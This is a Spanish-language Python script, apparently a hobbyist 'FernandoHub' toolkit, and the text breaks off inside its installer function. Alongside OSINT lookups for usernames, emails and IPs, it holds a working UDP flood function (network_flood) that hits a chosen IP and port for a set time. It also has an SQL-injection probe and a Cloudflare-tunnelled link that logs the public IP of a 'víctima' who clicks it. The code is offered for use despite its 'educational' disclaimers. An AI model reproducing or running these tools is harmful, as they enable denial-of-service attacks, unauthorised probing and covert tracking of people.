#!/usr/bin/env python3 
import sys
import subprocess
import os
import re
import socket
import threading
import time
import signal
import random
import platform
import shlex
import shutil
import importlib
import tempfile
from http.server import BaseHTTPRequestHandler, HTTPServer

# Intentar importar requests y dns (se garantizarÃ¡n mÃ¡s abajo)
try:
    import requests
except Exception:
    requests = None

try:
    import dns.resolver
except Exception:
    dns = None

# --- DefiniciÃ³n de cÃ³digos de color ANSI ---
VERDE = "\033[92m"
BLANCO = "\033[97m"
ROJO = "\033[91m"
AZUL = "\033[94m"
RESET = "\033[0m"

# ------------------ UTILIDADES DE INSTALACIÃ“N ------------------ #
def run_cmd(cmd, check=False):
    """Ejecuta comando y devuelve (returncode, stdout, stderr)"""
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=check)
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.CalledProcessError as e:
        return e.returncode, e.stdout if hasattr(e, 'stdout') else "", e.stderr if hasattr(e, 'stderr') else str(e)
    except FileNotFoundError:
        return 127, "", f"Command not found: {cmd[0]}"

def is_tool_installed(tool_name):
    """Comprueba si un ejecutable existe en PATH."""
    return shutil.which(tool_name) is not None

def try_package_manager_install(package_name):
    """
    Intenta instalar package_name usando varios gestores (pkg, apt, apt-get, dnf, yum, pacman, apk, brew, choco, snap).
    Devuelve True si alguna instalaciÃ³n parece exitosa.
    """
    managers = [
        ('pkg', ['install', '-y']),
        ('apt', ['update', '&&', 'apt', 'install', '-y']),  # preferimos update+install si apt estÃ¡ disponible
        ('apt-get', ['install', '-y']),
        ('dnf', ['install', '-y']),
        ('yum', ['install', '-y']),
        ('pacman', ['-Sy', '--noconfirm']),
        ('apk', ['add']),
        ('brew', ['install']),
        ('choco', ['install', '-y']),
        ('snap', ['install'])
    ]
    # Reordenar segÃºn plataforma (Termux prefer pkg)
    system = platform.system().lower()
    if 'android' in sys.platform or 'termux' in sys.platform:
        managers = sorted(managers, key=lambda x: 0 if x[0]=='pkg' else 1)
    elif 'darwin' in system or 'mac' in system:
        managers = sorted(managers, key=lambda x: 0 if x[0]=='brew' else 1)
    elif 'windows' in system:
        managers = sorted(managers, key=lambda x: 0 if x[0]=='choco' else 1)

    for mgr, flags in managers:
        if shutil.which(mgr) is None:
            continue
        print(f"{AZUL}[*] Intentando instalar {package_name} con {mgr}...{RESET}")
        try:
            # Si flags contiene '&&' lo ejecutamos a travÃ©s de shell
            if '&&' in flags:
                cmd = f"{mgr} {' '.join(flags)} {package_name}"
                proc = subprocess.run(cmd, shell=True)
            else:
                cmd = [mgr] + flags + [package_name]
                proc = subprocess.run(cmd)
            if proc.returncode == 0:
                print(f"{VERDE}[+] InstalaciÃ³n con {mgr} exitosa.{RESET}")
                return True
            else:
                print(f"{ROJO}[-] InstalaciÃ³n con {mgr} devolviÃ³ cÃ³digo {proc.returncode}.{RESET}")
        except Exception as e:
            print(f"{ROJO}[!] Error al intentar con {mgr}: {e}{RESET}")
            continue
    return False

def try_pip_install(pip_pkg):
    """Intenta instalar paquete Python con pip o pip3."""
    pip_bins = ['pip3', 'pip']
    for pip in pip_bins:
        if shutil.which(pip):
            print(f"{AZUL}[*] Intentando instalar paquete Python '{pip_pkg}' con {pip}...{RESET}")
            try:
                proc = subprocess.run([pip, 'install', pip_pkg])
                if proc.returncode == 0:
                    return True
            except Exception:
                continue
    # intentar usar python -m pip
    try:
        proc = subprocess.run([sys.executable, '-m', 'pip', 'install', pip_pkg])
        if proc.returncode == 0:
            return True
    except Exception:
        pass
    return False

def ensure_python_package(pkgname, import_name=None):
    """
    Asegura que un paquete Python estÃ© instalado e importable.
    pkgname: nombre para pip install
    import_name: nombre real para import (si distinto)
    """
    import_name = import_name or pkgname
    try:
        return importlib.import_module(import_name)
    except Exception:
        print(f"{AZUL}[*] Paquete Python '{import_name}' no encontrado. Intentando instalar...{RESET}")
        if try_pip_install(pkgname):
            try:
                return importlib.import_module(import_name)
            except Exception as e:
                print(f"{ROJO}[!] FallÃ³ importar {import_name} despuÃ©s de la instalaciÃ³n: {e}{RESET}")
                return None
        else:
            print(f"{ROJO}[!] No se pudo instalar '{pkgname}' con pip automÃ¡ticamente.{RESET}")
            return None

# AÃ±adimos una funciÃ³n auxiliar para intentar ejecutar con elevaciÃ³n (sudo/doas/su)
def try_with_elevated(cmd, use_shell=False):
    """
    Intenta ejecutar 'cmd' normalmente; si falla por permisos intenta con sudo, doas y su.
    Devuelve (rc, stdout, stderr, method) donde method puede ser 'normal','sudo','doas','su' o None.
    """
    # Intento normal
    try:
        if use_shell:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            proc = subprocess.run(cmd, capture_output=True, text=True)
        if proc.returncode == 0:
            return proc.returncode, proc.stdout, proc.stderr, 'normal'
    except FileNotFoundError:
        return 127, "", f"Command not found", None
    except PermissionError:
        pass
    except Exception:
        pass

    # Intentar sudo
    if shutil.which("sudo"):
        try:
            if use_shell:
                rc, out, err = run_cmd(["sudo", "sh", "-c", cmd] if isinstance(cmd, str) else ["sudo"] + list(cmd))
            else:
                rc, out, err = run_cmd(["sudo"] + (cmd if isinstance(cmd, list) else [cmd]))
            if rc == 0:
                return rc, out, err, 'sudo'
        except Exception:
            pass

    # Intentar doas
    if shutil.which("doas"):
        try:
            rc, out, err = run_cmd(["doas"] + (cmd if isinstance(cmd, list) else [cmd]))
            if rc == 0:
                return rc, out, err, 'doas'
        except Exception:
            pass

    # Intentar su -c
    if shutil.which("su"):
        try:
            cmd_str = cmd if isinstance(cmd, str) else " ".join(shlex.quote(x) for x in cmd)
            rc, out, err = run_cmd(["su", "-c", cmd_str])
            if rc == 0:
                return rc, out, err, 'su'
        except Exception:
            pass

    return 1, "", "All elevation attempts failed", None

def ensure_tool(tool, pkg_name=None, pip_pkg=None):
    """
    Asegura que exista un ejecutable en PATH.
    - tool: nombre del ejecutable a buscar (ej. 'nmap')
    - pkg_name: nombre del paquete del sistema para instalar (ej. 'nmap' o 'dnsutils')
    - pip_pkg: nombre de paquete pip en caso de que haya versiÃ³n Python alternativa (opcional)
    Devuelve True si el ejecutable estÃ¡ disponible o fue instalado/asegurado.
    """
    if is_tool_installed(tool):
        return True

    print(f"{AZUL}[*] '{tool}' no estÃ¡ en PATH. Intentando instalar/asegurar...{RESET}")

    # Si es cloudflared intentamos descarga desde releases (mÃ©todo robusto)
    if tool == 'cloudflared':
        if install_cloudflared_release():
            return True

    # 1) Intentar instalaciÃ³n por gestor de paquetes si pkg_name proporcionado
    if pkg_name:
        ok = try_package_manager_install(pkg_name)
        if ok and is_tool_installed(tool):
            print(f"{VERDE}[+] {tool} instalado con Ã©xito vÃ­a gestor de paquetes.{RESET}")
            return True

    # 2) Intentar pip si pip_pkg estÃ¡ dado
    if pip_pkg:
        if try_pip_install(pip_pkg):
            # puede que pip instale un ejecutable en ~/.local/bin â€” intentar actualizar PATH temporalmente
            if is_tool_installed(tool):
                return True
            # si no aparece el ejecutable pero importable, considerarlo instalado (para herramientas basadas en Python)
            try:
                importlib.import_module(pip_pkg)
                return True
            except Exception:
                pass

    # 3) Como Ãºltimo recurso, sugerir pasos manuales
    print(f"{ROJO}[!] No se pudo instalar '{tool}' automÃ¡ticamente.{RESET}")
    print(f"{AZUL}Sugerencia:{RESET} Instala manualmente '{pkg_name or tool}' Ã³ '{pip_pkg}', o ejecuta este script con privilegios si corresponde.")
    return False

# FunciÃ³n para descargar e instalar cloudflared desde releases oficiales si hace falta
def install_cloudflared_release():
    """
    Descarga un binario de cloudflared adecuado segÃºn arquitectura desde las releases de GitHub
    e intenta colocarlo en /usr/local/bin (o ~/bin si no hay permisos).
    Devuelve True si al final cloudflared estÃ¡ disponible o se dejÃ³ en ~/bin con permisos.
    """
    if is_tool_installed('cloudflared'):
        return True

    global requests
    if requests is None:
        requests = ensure_python_package('requests', 'requests')
        if requests is None:
            return False

    arch = platform.machine().lower()
    system = platform.system().lower()
    asset = None
    if 'linux' in system:
        if 'aarch64' in arch or 'arm64' in arch:
            asset = 'cloudflared-linux-arm64'
        elif 'arm' in arch and '64' not in arch:
            asset = 'cloudflared-linux-arm'
        elif 'x86_64' in arch or 'amd64' in arch:
            asset = 'cloudflared-linux-amd64'
        elif 'i386' in arch or 'i686' in arch:
            asset = 'cloudflared-linux-386'
    elif 'darwin' in system or 'mac' in system:
        if 'arm64' in arch or 'aarch64' in arch:
            asset = 'cloudflared-darwin-arm64'
        else:
            asset = 'cloudflared-darwin-amd64'
    elif 'windows' in system:
        if 'arm' in arch:
            asset = 'cloudflared-windows-arm64.exe'
        else:
            asset = 'cloudflared-windows-amd64.exe'

    if not asset:
        print(f"{ROJO}[!] Arquitectura/sistema no reconocido ({system}/{arch}).{RESET}")
        return False

    download_url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/{asset}"
    print(f"{AZUL}[*] Intentando descargar cloudflared desde: {download_url}{RESET}")
    try:
        with requests.get(download_url, stream=True, timeout=20) as r:
            if r.status_code != 200:
                print(f"{ROJO}[-] Descarga fallida (HTTP {r.status_code}).{RESET}")
                return False
            fd, tmp_path = tempfile.mkstemp(prefix='cloudflared_')
            os.close(fd)
            with open(tmp_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
    except Exception as e:
        print(f"{ROJO}[!] Error descargando cloudflared: {e}{RESET}")
        return False

    try:
        os.chmod(tmp_path, 0o755)
    except Exception:
        pass

    targets = ['/usr/local/bin', '/usr/bin', '/bin']
    moved = False
    filename = 'cloudflared.exe' if download_url.endswith('.exe') else 'cloudflared'
    for d in targets:
        try:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                dest = os.path.join(d, filename)
                shutil.move(tmp_path, dest)
                os.chmod(dest, 0o755)
                moved = True
                break
        except Exception:
            pass

    if not moved:
        # Fallback a ~/bin
        home_bin = os.path.join(os.path.expanduser('~'), 'bin')
        os.makedirs(home_bin, exist_ok=True)
        dest = os.path.join(home_bin, filename)
        try:
            shutil.move(tmp_path, dest)
        except Exception:
            try:
                with open(tmp_path, 'rb') as fr, open(dest, 'wb') as fw:
                    fw.write(fr.read())
                os.remove(tmp_path)
            except Exception as e:
                print(f"{ROJO}[!] No se pudo mover cloudflared a {home_bin}: {e}{RESET}")
                return False
        try:
            os.chmod(dest, 0o755)
        except Exception:
            pass
        print(f"{AZUL}[*] cloudflared instalado en: {dest}{RESET}")
        print(f"{AZUL}[*] AsegÃºrate de tener ~/bin en tu PATH: export PATH=\"$HOME/bin:$PATH\"{RESET}")
        moved = True

    if moved and is_tool_installed('cloudflared'):
        return True
    # si moved True pero no estÃ¡ en PATH, igualmente devolvemos True (usuario puede aÃ±adir al PATH)
    return moved

# ------------------ FIN UTILIDADES DE INSTALACIÃ“N ------------------ #

def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def print_banner():
    clear_screen()
    print(f"""{VERDE}


â–›â–€â–˜â–›â–€â–˜â–›â–€â––â–™ â–Œâ–žâ–€â––â–™ â–Œâ–›â–€â––â–žâ–€â––â–Œ     â–Œ  
â–™â–„ â–™â–„ â–™â–„â–˜â–Œâ–Œâ–Œâ–™â–„â–Œâ–Œâ–Œâ–Œâ–Œ â–Œâ–Œ â–Œâ–›â–€â––â–Œ â–Œâ–›â–€â––
â–Œ  â–Œ  â–Œâ–š â–Œâ–â–Œâ–Œ â–Œâ–Œâ–â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œ
â–˜  â–€â–€â–˜â–˜ â–˜â–˜ â–˜â–˜ â–˜â–˜ â–˜â–€â–€ â–â–€ â–˜ â–˜â–â–€â–˜â–€â–€ 

                                                                     

{RESET}""")

def create_sites_file():
    """
    BÃºsqueda jerÃ¡rquica de sitios_usuarios.txt:
    1) directorio FERNANDOhub/ (relativo al cwd)
    2) directorio actual
    Si no existe en ninguno, se informa y se crea un archivo por defecto en el directorio actual
    (esto para mantener compatibilidad con ejecuciones anteriores).
    """
    posibles = [
        os.path.join(os.getcwd(), "FERNANDOhub", "sitios_usuarios.txt"),
        os.path.join(os.getcwd(), "sitios_usuarios.txt")
    ]
    for ruta in posibles:
        if os.path.exists(ruta):
            print(f"{VERDE}[+] Archivo 'sitios_usuarios.txt' encontrado en: {ruta}{RESET}")
            return
    # Si no se encontrÃ³, informar y crear por defecto (compatibilidad)
    print(f"{ROJO}[!] 'sitios_usuarios.txt' no encontrado en el directorio actual ni en 'FERNANDOhub/'.{RESET}")
    print(f"{AZUL}[*] Creando un archivo por defecto en el directorio actual para mantener compatibilidad...{RESET}")
    try:
        with open("sitios_usuarios.txt", "w") as f:
            f.write("Facebook,https://www.facebook.com/{}\n")
            f.write("Instagram,https://www.instagram.com/{}\n")
            f.write("Twitter,https://twitter.com/{}\n")
            f.write("GitHub,https://github.com/{}\n")
            f.write("LinkedIn,https://www.linkedin.com/in/{}\n")
        print(f"{VERDE}[+] Archivo creado con Ã©xito en: {os.path.join(os.getcwd(),'sitios_usuarios.txt')}{RESET}")
    except Exception as e:
        print(f"{ROJO}[!] No se pudo crear 'sitios_usuarios.txt': {e}{RESET}")

# --- FUNCIONES PRINCIPALES (las tuyas, ajustadas para usar ensure_tool / ensure_python_package) --- #

def buscar_usuario():
    username = input(f"{AZUL}[*] Ingresa el nombre de usuario a buscar: {RESET}")
    print(f"[*] Buscando el nombre de usuario {AZUL}{username}{RESET}...")
    sitios_encontrados = []
    # Buscar el archivo primero en FERNANDOhub/ luego en cwd (create_sites_file se encarga de asegurar su existencia)
    posibles = [
        os.path.join(os.getcwd(), "FERNANDOhub", "sitios_usuarios.txt"),
        os.path.join(os.getcwd(), "sitios_usuarios.txt")
    ]
    found_path = None
    for ruta in posibles:
        if os.path.exists(ruta):
            found_path = ruta
            break
    if not found_path:
        print(f"{ROJO}[!] El archivo 'sitios_usuarios.txt' no se encontrÃ³. Ejecuta la opciÃ³n correspondiente para crear o coloca el archivo en 'FERNANDOhub/'.{RESET}")
        return []

    try:
        with open(found_path, "r") as f:
            lineas = f.readlines()
    except FileNotFoundError:
        print(f"[!] El archivo '{BLANCO}sitios_usuarios.txt{RESET}' no se encontrÃ³.")
        return []

    for linea in lineas:
        linea = linea.strip()
        if not linea or ',' not in linea:
            continue
        try:
            nombre_sitio, url_base = linea.split(",", 1)
            url_perfil = url_base.format(username)
            print(f"[*] Probando {nombre_sitio}...")
            # Asegurar requests
            global requests
            if requests is None:
                requests = ensure_python_package('requests', 'requests')
                if requests is None:
                    print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
                    return sitios_encontrados
            response = requests.get(url_perfil, timeout=5)
            if response.status_code == 200:
                print(f"{VERDE}[+] Usuario '{username}' ENCONTRADO en {nombre_sitio}{RESET}")
                sitios_encontrados.append(url_perfil)
            else:
                print(f"{ROJO}[-] Usuario '{username}' NO ENCONTRADO en {nombre_sitio}.{RESET}")
        except Exception:
             print(f"[!] {BLANCO}Error al conectar{RESET} con {nombre_sitio} para '{username}'.")
    return sitios_encontrados

def buscar_correo():
    email = input(f"{AZUL}[*] Ingresa el correo electrÃ³nico a buscar: {RESET}")
    print(f"[*] Usando la herramienta {VERDE}Holehe{RESET} para buscar el correo: {email}")
    print("---")

    if "@" in email and "." in email:
        # asegurar holehe (es paquete pip)
        ok = ensure_tool('holehe', pkg_name=None, pip_pkg='holehe')
        if not ok:
            print(f"{ROJO}[!] No se pudo instalar 'holehe'. Puedes intentar: pip install holehe{RESET}")
            return

        try:
            proceso = subprocess.run(['holehe', email], capture_output=True, text=True, check=True)
            salida_holehe = proceso.stdout
        except (FileNotFoundError, subprocess.CalledProcessError):
            print(f"{ROJO}[!] No se pudo ejecutar Holehe.{RESET}")
            return
    else:
        print(f"{ROJO}[!] ERROR:{RESET} El formato del correo electrÃ³nico es incorrecto.")
        return 

    lineas = salida_holehe.split('\n')
    urls_registradas = []
    for linea in lineas:
        if "Registered" in linea or "Exists" in linea:
            match = re.search(r'https?://[a-zA-Z0-9.-]+', linea)
            if match:
                urls_registradas.append(match.group(0))

    print(f"\n{VERDE}Correo registrado en:{RESET}")
    if urls_registradas:
        for url in urls_registradas:
            print(f"{VERDE}  - {url}{RESET}")
    else:
        print(f"{BLANCO}  - No se encontrÃ³ registro en sitios populares.{RESET}")
    print(f"\n{BLANCO}--- Salida completa de Holehe ---{RESET}")
    print(salida_holehe)

def track_ip(ip_address=None):
    if ip_address is None:
        ip_address = input(f"{AZUL}[*] Ingresa la direcciÃ³n IP a rastrear: {RESET}")
    print(f"[*] Rastreo de IP en progreso para: {AZUL}{ip_address}{RESET}")
    print("---")
    # asegurar requests
    global requests
    if requests is None:
        requests = ensure_python_package('requests', 'requests')
        if requests is None:
            print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
            return

    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            print(f"{VERDE}[+] InformaciÃ³n de IP encontrada:{RESET}")
            print(f"  - PaÃ­s: {data.get('country')}")
            print(f"  - Ciudad: {data.get('city')}")
            print(f"  - RegiÃ³n: {data.get('regionName')}")
            print(f"  - ISP: {data.get('isp')}")
            print(f"  - OrganizaciÃ³n: {data.get('org')}")
            print(f"  - Latitud/Longitud: {data.get('lat')}, {data.get('lon')}")
        else:
            print(f"{ROJO}[-] No se pudo obtener informaciÃ³n para la IP: {ip_address}{RESET}")
            print(f"{BLANCO}Mensaje de error: {data.get('message')}{RESET}")
    except requests.exceptions.RequestException:
        print(f"{ROJO}[!] Error al conectar con el servicio de rastreo de IP.{RESET}")

def scan_vulnerability():
    url = input(f"{AZUL}[*] Ingresa la URL a escanear (ej. http://ejemplo.com/page.php?id=1): {RESET}")
    print(f"\n[*] Analizando vulnerabilidad de inyecciÃ³n SQL en: {AZUL}{url}{RESET}")
    payloads = ["'", "''", '"', '""']
    sql_errors = ["SQL syntax", "mysql_fetch_array()", "Warning: mysql_query()"]
    # asegurar requests
    global requests
    if requests is None:
        requests = ensure_python_package('requests', 'requests')
        if requests is None:
            print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
            return

    try:
        for payload in payloads:
            test_url = f"{url}'" if '?' not in url else f"{url}{payload}"
            print(f"[*] Probando con el payload: {payload}")
            response = requests.get(test_url, timeout=10)
            for error in sql_errors:
                if error in response.text:
                    print(f"\n{ROJO}[!] POSIBLE VULNERABILIDAD DETECTADA:{RESET}")
                    print(f"    - URL vulnerable: {test_url}")
                    print(f"    - Error de base de datos encontrado: {error}")
                    print(f"{VERDE}[+] Recomiendo un anÃ¡lisis mÃ¡s profundo con herramientas especializadas.{RESET}")
                    return
        print(f"\n{VERDE}[+] No se detectaron vulnerabilidades de inyecciÃ³n SQL obvias.{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{ROJO}[!] Error de conexiÃ³n: {e}{RESET}")

cloudflared_pid = None
class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # IP de conexiÃ³n directa (normalmente privada si hay proxy/tÃºnel)
        client_ip = self.client_address[0]

        # Intenta extraer la IP pÃºblica real del cliente desde varios headers comunes
        header_candidates = [
            'X-Forwarded-For',
            'X-Real-IP',
            'CF-Connecting-IP',
            'True-Client-IP',
            'X-Original-Forwarded-For',
            'Forwarded'
        ]

        public_ip = None
        for h in header_candidates:
            val = self.headers.get(h)
            if val:
                if h.lower() == 'forwarded':
                    m = re.search(r'for="?([\d\.]+)"?', val)
                    if m:
                        public_ip = m.group(1)
                        break
                else:
                    first = [x.strip() for x in val.split(',') if x.strip()]
                    if first:
                        public_ip = first[0]
                        break

        if public_ip:
            print(f"\n{VERDE}[+] ConexiÃ³n recibida{RESET}")
            print(f"    - IP del cliente (privada): {AZUL}{client_ip}{RESET}")
            print(f"    - IP del cliente (pÃºblica): {AZUL}{public_ip}{RESET}")
        else:
            print(f"\n{VERDE}[+] ConexiÃ³n recibida{RESET}")
            print(f"    - IP del cliente: {AZUL}{client_ip}{RESET}")
            print(f"    - {ROJO}No se pudo obtener la IP pÃºblica.{RESET}")

        try:
            if cloudflared_pid:
                os.kill(cloudflared_pid, signal.SIGINT)
        except NameError:
            pass
        except Exception:
            pass

        # Servir una pÃ¡gina con enlace educativo sobre phishing
        phishing_info_url = "https://www.cisa.gov/stopransomware/what-is-phishing"  # recurso educativo
        html = f"""
        <html>
          <head><meta charset="utf-8"><title>Conectado</title></head>
          <body>
            <h1>Conectado</h1>
            <p>Tu conexiÃ³n fue registrada. Verifica la consola del servidor para ver IPs.</p>
            <p>Para informaciÃ³n educativa sobre phishing visita:</p>
            <p><a href="{phishing_info_url}" target="_blank" rel="noopener noreferrer">Â¿QuÃ© es el phishing? - Recurso educativo</a></p>
            <hr>
            <small>Uso responsable: este servicio es para pruebas/educaciÃ³n. No uses para actividades maliciosas.</small>
          </body>
        </html>
        """
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except Exception:
            pass

        # Mantengo el comportamiento original: cerrar servidor si esa era la intenciÃ³n
        try:
            self.server.shutdown()
        except Exception:
            pass

def run_server(port):
    try:
        server = HTTPServer(('0.0.0.0', port), MyHandler)
        server.serve_forever()
    except Exception as e:
        print(f"{ROJO}[!] ERROR al iniciar el servidor: {e}{RESET}")

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def get_ip_from_link():
    port_str = input(f"{AZUL}[*] Ingresa el puerto para el servidor local (ej. 8080): {RESET}")
    try:
        port = int(port_str)
    except ValueError:
        print(f"{ROJO}[!] El puerto debe ser un nÃºmero vÃ¡lido.{RESET}")
        return

    global cloudflared_pid
    current_port = port
    while is_port_in_use(current_port):
        print(f"{ROJO}[!] El puerto {current_port} ya estÃ¡ en uso.{RESET}")
        if current_port >= 9995:
            print(f"{ROJO}[!] No se pudo encontrar un puerto disponible en el rango. Saliendo...{RESET}")
            return
        current_port += 5
        print(f"[*] Intentando con el siguiente puerto disponible: {AZUL}{current_port}{RESET}")
    final_port = current_port
    server_thread = threading.Thread(target=run_server, args=(final_port,))
    server_thread.daemon = True
    server_thread.start()
    print(f"\n[*] Servidor local iniciando en el puerto {final_port}...")
    time.sleep(1)
    print("[*] Servidor local iniciado.")
    
    # asegurar cloudflared
    if not ensure_tool('cloudflared', pkg_name='cloudflared', pip_pkg=None):
        print(f"{ROJO}[!] cloudflared no disponible. InstÃ¡lalo manualmente si quieres usar tÃºneles.{RESET}")
        return
    
    print(f"\n[*] Levantando un tÃºnel pÃºblico con Cloudflare...")
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{final_port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        cloudflared_pid = process.pid
        public_url = None
        for line in process.stdout:
            print(line, end='')
            match = re.search(r'https?://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
            if match:
                public_url = match.group(0)
                print(f"\n{VERDE}[+] Â¡TÃºnel generado con Ã©xito!{RESET}")
                print(f"[*] Enlace de rastreo: {AZUL}{public_url}{RESET}")
                print("\n[*] Esperando la conexiÃ³n de la vÃ­ctima... (usa de forma responsable)")
                break
        if public_url:
            process.wait()
        else:
            try:
                error_output = process.stderr.read()
            except Exception:
                error_output = ""
            print(f"{ROJO}[!] No se pudo obtener el enlace del tÃºnel. Salida de error:\n{error_output}{RESET}")
            process.kill()
    except FileNotFoundError:
        print(f"{ROJO}[!] El comando 'cloudflared' no se encontrÃ³.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] InterrupciÃ³n por el usuario. Deteniendo el tÃºnel y el servidor.{RESET}")
    finally:
        if 'process' in locals() and process.poll() is None:
            process.terminate()
            process.wait()
        sys.exit(0)

# ==== AtenciÃ³n: Gracias por su atencion =====
def network_flood():
    target = input(f"{AZUL}[*] Ingresa la IP, el puerto y la duraciÃ³n (ej. 192.168.1.1:80:60): {RESET}")
    try:
        ip_port_duration = target.split(':')
        if len(ip_port_duration) != 3:
            print(f"{ROJO}[!] Formato incorrecto. Usa: IP:PUERTO:DURACION{RESET}")
            return
        ip, port_str, duration_str = ip_port_duration
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        print(f"{ROJO}[!] Formato incorrecto para el puerto o la duraciÃ³n. Deben ser nÃºmeros enteros.{RESET}")
        return

    print(f"\n[*] Iniciando inundaciÃ³n UDP a {ip}:{port} durante {duration} segundos...")
    packet_count = 0
    start_time = time.time()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
        while time.time() < start_time + duration:
            s.sendto(packet, (ip, port))
            packet_count += 1
        s.close()
    except socket.gaierror:
        print(f"\n{ROJO}[!] ERROR: DirecciÃ³n o nombre de host invÃ¡lido.{RESET}")
    except Exception as e:
        print(f"\n{ROJO}[!] ERROR: OcurriÃ³ un error inesperado: {e}{RESET}")
    finally:
        print(f"\n[+] InundaciÃ³n finalizada. Paquetes enviados: {packet_count}")# ========================================================================================

def get_website_info():
    url = input(f"{AZUL}[*] Ingresa la URL o dominio del sitio web (ej. google.com): {RESET}")
    print(f"[*] Obteniendo informaciÃ³n de {AZUL}{url}{RESET}...")
    
    if not url.startswith("http"):
        url = "http://" + url
    
    domain = url.split("//")[-1].split("/")[0]

    # asegurar requests antes de proceder
    global requests
    if requests is None:
        requests = ensure_python_package('requests', 'requests')
        if requests is None:
            print(f"{ROJO}[!] Necesitas 'requests' para obtener info del sitio.{RESET}")
            return

    try:
        ip_address = socket.gethostbyname(domain)
        print(f"{VERDE}[+] DirecciÃ³n IP:{RESET} {ip_address}")
        print(f"\n[*] Headers del servidor...")
        try:
            response = requests.get(url, timeout=5)
            headers = response.headers
            key_headers = [
                'Server','Content-Type','Content-Length','Date',
                'Cache-Control','X-Frame-Options','Content-Encoding'
            ]
            for key in key_headers:
                value = headers.get(key, 'No disponible')
                print(f"  - {key}: {value}")
        except requests.exceptions.RequestException as e:
            print(f"{ROJO}[-] No se pudo obtener headers: {e}{RESET}")

        print(f"\n[*] GeolocalizaciÃ³n de la IP...")
        track_ip(ip_address)
        
        print(f"\n[*] Servidores DNS (NS)...")
        # asegurar dig (dnsutils)
        if not ensure_tool('dig', pkg_name='dnsutils', pip_pkg=None):
            print(f"{ROJO}[!] 'dig' no disponible. Saltando verificaciÃ³n NS.{RESET}")
        else:
            try:
                result = subprocess.run(['dig', '+short', domain, 'NS'], capture_output=True, text=True, check=True)
                if result.stdout:
                    for line in result.stdout.strip().split('\n'):
                        print(f"  - {line}")
                else:
                    print(f"{ROJO}[-] No se encontraron registros NS para el dominio.{RESET}")
            except Exception as e:
                print(f"{ROJO}[-] No se pudo resolver los registros DNS: {e}{RESET}")

    except socket.gaierror:
        print(f"{ROJO}[!] ERROR: No se pudo resolver la direcciÃ³n del sitio web.{RESET}")
    except Exception as e:
        print(f"{ROJO}[!] OcurriÃ³ un error inesperado: {e}{RESET}")

def install_tool():
    """
    Instala un lanzador 'Fh' para ejecutar el script desde cualquier lugar.
    Funciona en Linux (incl. Termux), macOS y Windows.
    """
    script_path = os.path.abspath(__file__)
    home = os.path.expanduser("~")
    system = platform.system().lower()

    # Rutas candidatas por sistema (ordenadas por prioridad)
    candidates = []
    if "termux" in sys.platform or "android" in system:
        candidates.append("/data/data/com.termux/files/usr/bin")
    candidates += ["/usr/local/bin", "/usr/bin", "/bin", "/opt/homebrew/bin"]
    candidates.append(os.path.join(home, "bin"))
    if system == "windows":
        appdata = os.environ.get("APPDATA")
        localappdata = os.environ.get("LOCALAPPDATA")
        userprofile = os.environ.get("USERPROFILE", home)
        if localappdata:
            candidates.insert(0, os.path.join(localappdata, "Programs"))
        candidates.insert(0, userprofile)

    # Filtrar Ãºnicos y absolutos
    seen = set(); filtered = []
    for p in candidates:
        if p and os.path.isabs(p) and p not in seen:
            filtered.append(p); seen.add(p)
    candidates = filtered

    chosen = None
    for d in candidates:
        try:
            if d.endswith(os.path.join("", "bin")) and not os.path.exists(d):
                os.makedirs(d, exist_ok=True)
            if os.path.isdir(d) and os.access(d, os.W_OK):
                chosen = d; break
        except Exception:
            continue

    if not chosen:
        fallback = os.path.join(home, "bin")
        try:
            os.makedirs(fallback, exist_ok=True)
            if os.access(fallback, os.W_OK):
                chosen = fallback
        except Exception:
            chosen = None

    if not chosen:
        print(f"\n{ROJO}[!] No se encontrÃ³ un directorio de instalaciÃ³n escribible automÃ¡ticamente.{RESET}")
        print("Puedes ejecutar este script como root (sudo) o crear manualmente ~/bin y aÃ±adirlo a tu PATH.")
        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
        return

    try:
        if system == "windows":
            launcher_path = os.path.join(chosen, "Fh.bat")
            bat_content = f'@echo off\r\npython "{script_path}" %*\r\n'
            with open(launcher_path, "w", newline="\r\n") as f:
                f.write(bat_content)
            print(f"\n{VERDE}[+] Lanzador creado en: {launcher_path}{RESET}")
        else:
            launcher_path = os.path.join(chosen, "Fh")
            sh_content = f"#!/usr/bin/env bash\npython3 \"{script_path}\" \"$@\"\n"
            with open(launcher_path, "w", newline="\n") as f:
                f.write(sh_content)
            try:
                os.chmod(launcher_path, 0o755)
            except Exception:
                pass
            print(f"\n{VERDE}[+] Lanzador creado en: {launcher_path}{RESET}")
            # Si elegimos ~/bin y no estÃ¡ en PATH, aÃ±adir en ~/.profile
            if chosen == os.path.join(home, "bin"):
                path_env = os.environ.get("PATH", "")
                if os.path.join(home, "bin") not in path_env:
                    profile = os.path.join(home, ".profile")
                    line = '\n# Added by FernandoHub installer\nexport PATH="$HOME/bin:$PATH"\n'
                    try:
                        with open(profile, "a") as f:
